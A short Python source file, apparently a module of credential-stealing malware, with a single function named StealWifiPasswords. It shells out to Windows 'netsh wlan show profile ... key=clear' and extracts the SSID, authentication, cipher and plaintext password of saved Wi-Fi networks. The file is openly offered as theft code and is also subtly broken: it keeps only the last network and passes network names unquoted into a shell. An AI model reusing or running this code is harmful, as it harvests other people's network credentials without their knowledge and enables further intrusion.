# Import modules

import re 
import subprocess


# Get wifi auth credentials

def StealWifiPasswords():
	Result = []
	Chcp = 'chcp 65001 && '
	Networks = subprocess.check_output(f'{Chcp}netsh wlan show profile',
		shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
	Networks = Networks.decode(encoding='utf-8', errors='strict')
	NetworkNamesList = re.findall('(?:Profile\\s*:\\s)(.*)', Networks) 
	for NetworkName in NetworkNamesList:
		CurrentResult = subprocess.check_output(f'{Chcp}netsh wlan show profile {NetworkName} key=clear',
			shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
		CurrentResult = CurrentResult.decode(encoding='utf-8', errors='strict')        
		SSID = re.findall('(?:SSID name\\s*:\\s)(.*)', str(CurrentResult))[0].replace('\r', '').replace("\"", '')
		Authentication = re.findall(r'(?:Authentication\s*:\s)(.*)', CurrentResult)[0].replace('\r', '')
		Cipher = re.findall('(?:Cipher\\s*:\\s)(.*)', CurrentResult)[0].replace('\r', '')
		SecurityKey = re.findall(r'(?:Security key\s*:\s)(.*)', CurrentResult)[0].replace('\r', '')
		Password = re.findall('(?:Key Content\\s*:\\s)(.*)', CurrentResult)[0].replace('\r', '')
		WiFi = {
			'SSID': SSID,
			'AUTH': Authentication,
			'Cipher': Cipher,
			'SecurityKey': SecurityKey,
			'Password': Password
		}

	return WiFi